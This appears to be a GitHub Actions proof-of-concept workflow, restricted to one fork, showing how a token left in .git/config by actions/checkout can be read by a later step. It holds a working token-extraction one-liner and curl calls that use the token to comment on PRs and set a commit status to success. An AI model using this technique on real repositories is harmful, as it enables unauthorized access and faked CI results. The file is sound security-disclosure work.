name: PoC - credential impact demo

# Manual trigger only, and ONLY EVER runs against your own fork.
# Every job below refuses to execute unless github.repository is your fork -
# this file must never be pointed at angular/components or any repo you
# don't own. Using a persisted token this way against a repo you're not
# authorized to test is unauthorized access, not research.
on:
  workflow_dispatch:
    inputs:
      target_pr_number:
        description: "PR number on YOUR OWN fork to comment on (create a tiny throwaway PR first, e.g. any branch -> main)"
        required: true
      target_commit_sha:
        description: "Any commit SHA on YOUR OWN fork to set a status on"
        required: true

jobs:
  impact-pull-requests-write:
    name: "Impact: pull-requests:write (mirrors docs-preview-deploy.yml / preview-deploy-dev-app.yml)"
    runs-on: ubuntu-latest
    # This is the EXACT scope those two real workflows declare - not a
    # broader ask. The point is to prove what THAT specific grant allows.
    permissions:
      pull-requests: write
      contents: read
    steps:
      - name: Refuse to run anywhere except your own fork
        run: |
          if [ "${{ github.repository }}" != "ShraddhaZoman/components" ]; then
            echo "::error::Scoped to ShraddhaZoman/components only. Refusing to run elsewhere."
            exit 1
          fi

      - name: "Checkout (same vulnerable config as the real workflow - no persist-credentials: false)"
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0

      - name: Simulated compromised later step (e.g. a poisoned npx package, exactly like firebase-tools@latest in the real workflow)
        env:
          PR_NUMBER: ${{ github.event.inputs.target_pr_number }}
        run: |
          # This step is handed NOTHING - no token input, no secrets: block.
          # It only reads whatever checkout left behind in .git/config,
          # exactly what a compromised third-party dependency would see.
          TOKEN=$(git config --get http.https://github.com/.extraheader | sed 's/AUTHORIZATION: basic //' | base64 -d | cut -d: -f2)
          echo "::add-mask::$TOKEN"

          if [ -z "$TOKEN" ]; then
            echo "No persisted credential found - nothing to demonstrate."
            exit 0
          fi

          echo "Found a persisted credential this step was never given directly."
          echo "Using it to comment on PR #$PR_NUMBER on your own fork (harmless, deletable - proves capability only)."

          curl -s -X POST \
            -H "Authorization: token $TOKEN" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${{ github.repository }}/issues/${PR_NUMBER}/comments" \
            -d '{"body":"PoC only - this comment was posted by a step that was never directly given a credential. It read one left behind in .git/config by checkout running without persist-credentials: false. Safe to delete."}'

  impact-statuses-write:
    name: "Impact: statuses:write (mirrors google-internal-tests.yml)"
    runs-on: ubuntu-latest
    # Again, the exact scope the real workflow declares.
    permissions:
      statuses: write
      pull-requests: read
      contents: read
    steps:
      - name: Refuse to run anywhere except your own fork
        run: |
          if [ "${{ github.repository }}" != "ShraddhaZoman/components" ]; then
            echo "::error::Scoped to ShraddhaZoman/components only. Refusing to run elsewhere."
            exit 1
          fi

      - name: Checkout (same vulnerable config as the real workflow)
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0

      - name: Simulated compromised later step
        env:
          SHA: ${{ github.event.inputs.target_commit_sha }}
        run: |
          TOKEN=$(git config --get http.https://github.com/.extraheader | sed 's/AUTHORIZATION: basic //' | base64 -d | cut -d: -f2)
          echo "::add-mask::$TOKEN"

          if [ -z "$TOKEN" ]; then
            echo "No persisted credential found - nothing to demonstrate."
            exit 0
          fi

          echo "Setting a commit status using only the credential left behind after checkout - a compromised dependency here could just as easily mark a failing check as passing."

          curl -s -X POST \
            -H "Authorization: token $TOKEN" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${{ github.repository }}/statuses/${SHA}" \
            -d '{"state":"success","context":"poc/persisted-credential","description":"Set by a step that was never given a token - PoC only, safe to ignore."}'